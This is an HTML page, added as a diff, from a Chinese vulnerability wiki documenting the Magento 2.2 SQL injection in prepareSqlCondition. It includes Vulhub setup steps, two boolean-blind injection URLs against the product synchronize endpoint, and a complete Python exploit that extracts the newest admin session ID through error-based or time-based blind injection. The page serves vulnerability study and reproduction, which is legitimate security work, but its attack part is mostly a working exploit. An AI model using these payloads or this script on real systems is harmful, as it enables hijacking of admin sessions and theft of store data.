@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/Magento%202.2%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Magento 2.2 SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Magento 2.2 SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" class="btn btn-xs btn-link">
+        MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../MLflow%20get-artifact%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2023-1177/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../MLflow%20get-artifact%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2023-1177/" class="btn btn-xs btn-link">
+        MLflow get-artifact 任意文件读取漏洞 CVE-2023-1177
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="magento-22-sql">Magento 2.2 SQL注入漏洞<a class="headerlink" href="#magento-22-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Magento（麦进斗）是一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framework框架。设计得非常灵活，具有模块化架构体系和丰富的功能。</p>
+<p>其prepareSqlCondition函数存在一处二次格式化字符串的bug，导致引入了非预期的单引号，造成SQL注入漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.ambionics.io/blog/magento-sqli">https://www.ambionics.io/blog/magento-sqli</a></li>
+<li><a href="https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html">https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub执行如下命令启动Magento 2.2.7：</p>
+<div class="highlight"><pre><span></span><code>docker-compose up -d
+</code></pre></div>
+<p>环境启动后，访问<code>http://your-ip:8080</code>，即可看到Magento的安装页面。安装Magento时，数据库地址填写<code>mysql</code>，账号密码均为<code>root</code>，其他保持默认：</p>
+<p><img alt="image-20220226212736796" src="../images/202202262127885.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>分别访问如下链接：</p>
+<div class="highlight"><pre><span></span><code>http://your-vp-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=%3f&amp;ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
+</code></pre></div>
+<p><img alt="image-20220226213103681" src="../images/202202262131770.png" /></p>
+<div class="highlight"><pre><span></span><code>http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=%3f&amp;ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
+</code></pre></div>
+<p><img alt="image-20220226213118491" src="../images/202202262131576.png" /></p>
+<p>可见，在执行<code>))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -</code>和<code>))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -</code>时，返回的HTTP状态码不同。</p>
+<p>通过改变OR的条件，即可实现SQL BOOL型盲注。</p>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>利用<a href="https://github.com/ambionics/magento-exploits">这个POC</a>，可以读取管理员的session：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># Magento 2.2.0 &lt;= 2.3.0 Unauthenticated SQLi</span>
+<span class="c1"># Charles Fol</span>
+<span class="c1"># 2019-03-22</span>
+<span class="c1">#</span>
+<span class="c1"># SOURCE &amp; SINK</span>
+<span class="c1"># The sink (from-to SQL condition) has been present from Magento 1.x onwards.</span>
+<span class="c1"># The source (/catalog/product_frontend_action/synchronize) from 2.2.0.</span>
+<span class="c1"># If your target runs Magento &lt; 2.2.0, you need to find another source.</span>
+<span class="c1">#</span>
+<span class="c1"># SQL INJECTION</span>
+<span class="c1"># The exploit can easily be modified to obtain other stuff from the DB, for</span>
+<span class="c1"># instance admin/user password hashes.</span>
+<span class="c1">#</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">binascii</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib3.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">category</span><span class="o">=</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">sqli</span> <span class="o">=</span> <span class="n">SQLInjection</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">sqli</span><span class="o">.</span><span class="n">find_test_method</span><span class="p">()</span>
+        <span class="n">sid</span> <span class="o">=</span> <span class="n">sqli</span><span class="o">.</span><span class="n">get_most_recent_session</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">ExploitError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Error: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">e</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">random_string</span><span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">ExploitError</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
+    <span class="k">pass</span>
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">Browser</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Basic browser functionality along w/ URLs and payloads.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">PROXY</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">URL</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">URL</span> <span class="o">=</span> <span class="n">URL</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">PROXY</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">PROXY</span><span class="p">,</span>
+                <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">PROXY</span><span class="p">,</span>
+            <span class="p">}</span>
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">SQLInjection</span><span class="p">(</span><span class="n">Browser</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;SQL injection stuff.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">encode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">string</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">find_test_method</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;Tries to inject using an error-based technique, or falls back to timebased.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">for</span> <span class="n">test_method</span> <span class="ow">in</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">test_error</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">test_timebased</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">test_method</span><span class="p">(</span><span class="s1">&#39;123=123&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">test_method</span><span class="p">(</span><span class="s1">&#39;123=124&#39;</span><span class="p">):</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">test</span> <span class="o">=</span> <span class="n">test_method</span>
+                <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">ExploitError</span><span class="p">(</span><span class="s1">&#39;Test SQL injections failed, not vulnerable ?&#39;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">test_timebased</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">condition</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;Runs a test. A valid condition results in a sleep of 1 second.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;))) OR (SELECT*FROM (SELECT SLEEP((</span><span class="si">%s</span><span class="s1">)))a)=1 -- -&#39;</span> <span class="o">%</span> <span class="n">condition</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/catalog/product_frontend_action/synchronize&#39;</span><span class="p">,</span>
+            <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+                <span class="s1">&#39;type_id&#39;</span><span class="p">:</span> <span class="s1">&#39;recently_products&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;ids[0][added_at]&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;ids[0][product_id][from]&#39;</span><span class="p">:</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;ids[0][product_id][to]&#39;</span><span class="p">:</span> <span class="n">payload</span>
+            <span class="p">}</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">1</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">test_error</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">condition</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;Runs a test. An invalid condition results in an SQL error.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE </span><span class="si">%s</span><span class="s1">) -- -&#39;</span> <span class="o">%</span> <span class="n">condition</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/catalog/product_frontend_action/synchronize&#39;</span><span class="p">,</span>
+            <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+                <span class="s1">&#39;type_id&#39;</span><span class="p">:</span> <span class="s1">&#39;recently_products&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;ids[0][added_at]&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;ids[0][product_id][from]&#39;</span><span class="p">:</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;ids[0][product_id][to]&#39;</span><span class="p">:</span> <span class="n">payload</span>
+            <span class="p">}</span>
+        <span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="mi">400</span><span class="p">):</span>
+            <span class="k">raise</span> <span class="n">ExploitError</span><span class="p">(</span>
+                <span class="s1">&#39;SQL injection does not yield a correct HTTP response&#39;</span>
+            <span class="p">)</span>
+        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">400</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">word</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">charset</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;Dichotomically obtains a value.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="s1">&#39;LOCATE(SUBSTR((</span><span class="si">%s</span><span class="s1">),</span><span class="si">%d</span><span class="s1">,1),BINARY </span><span class="si">%s</span><span class="s1">)=0&#39;</span>
+        <span class="n">full</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+        <span class="n">check</span> <span class="o">=</span> <span class="kc">False</span>
+
+        <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="c1"># Yeah whatever</span>
+            <span class="n">size_size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">word</span><span class="p">(</span>
+                <span class="n">name</span><span class="p">,</span>
+                <span class="s1">&#39;LENGTH(LENGTH(</span><span class="si">%s</span><span class="s1">))&#39;</span> <span class="o">%</span> <span class="n">sql</span><span class="p">,</span>
+                <span class="n">size</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+                <span class="n">charset</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+            <span class="p">)</span>
+            <span class="n">size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">word</span><span class="p">(</span>
+                <span class="n">name</span><span class="p">,</span>
+                <span class="s1">&#39;LENGTH(</span><span class="si">%s</span><span class="s1">)&#39;</span> <span class="o">%</span> <span class="n">sql</span><span class="p">,</span>
+                <span class="n">size</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">size_size</span><span class="p">),</span>
+                <span class="n">charset</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+            <span class="p">)</span>
+            <span class="n">size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">full</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+
+        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="n">charset</span>
+
+            <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">middle</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+                <span class="n">h0</span><span class="p">,</span> <span class="n">h1</span> <span class="o">=</span> <span class="n">c</span><span class="p">[:</span><span class="n">middle</span><span class="p">],</span> <span class="n">c</span><span class="p">[</span><span class="n">middle</span><span class="p">:]</span>
+                <span class="n">condition</span> <span class="o">=</span> <span class="n">pattern</span> <span class="o">%</span> <span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">h0</span><span class="p">))</span>
+                <span class="n">c</span> <span class="o">=</span> <span class="n">h1</span> <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">condition</span><span class="p">)</span> <span class="k">else</span> <span class="n">h0</span>
+
+            <span class="n">full</span> <span class="o">+=</span> <span class="n">c</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">full</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">full</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">full</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_most_recent_session</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;Grabs the last created session. We don&#39;t need special privileges aside from creating a product so any session</span>
+<span class="sd">        should do. Otherwise, the process can be improved by grabbing each session one by one and trying to reach the</span>
+<span class="sd">        backend.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="c1"># This is the default admin session timeout</span>
+        <span class="n">session_timeout</span> <span class="o">=</span> <span class="mi">900</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="s1">&#39;SELECT </span><span class="si">%%</span><span class="s1">s FROM admin_user_session &#39;</span>
+            <span class="s1">&#39;WHERE TIMESTAMPDIFF(SECOND, updated_at, NOW()) BETWEEN 0 AND </span><span class="si">%d</span><span class="s1"> &#39;</span>
+            <span class="s1">&#39;ORDER BY created_at DESC, updated_at DESC LIMIT 1&#39;</span>
+        <span class="p">)</span> <span class="o">%</span> <span class="n">session_timeout</span>
+
+        <span class="c1"># Check if a session is available</span>
+
+        <span class="n">available</span> <span class="o">=</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;(</span><span class="si">%s</span><span class="s1">)=0&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">query</span> <span class="o">%</span> <span class="s1">&#39;COUNT(*)&#39;</span><span class="p">))</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">available</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">ExploitError</span><span class="p">(</span><span class="s1">&#39;No session is available&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;An admin session is available !&#39;</span><span class="p">)</span>
+
+        <span class="c1"># Fetch it</span>
+
+        <span class="n">sid</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">word</span><span class="p">(</span>
+            <span class="s1">&#39;Session ID&#39;</span><span class="p">,</span>
+            <span class="n">query</span> <span class="o">%</span> <span class="s1">&#39;session_id&#39;</span><span class="p">,</span>
+            <span class="n">charset</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span>
+            <span class="n">size</span><span class="o">=</span><span class="mi">26</span>
+        <span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Session ID: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">sid</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">sid</span>
+
+<span class="n">run</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" class="btn btn-xs btn-link">
+        MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../MLflow%20get-artifact%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2023-1177/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../MLflow%20get-artifact%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2023-1177/" class="btn btn-xs btn-link">
+        MLflow get-artifact 任意文件读取漏洞 CVE-2023-1177
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
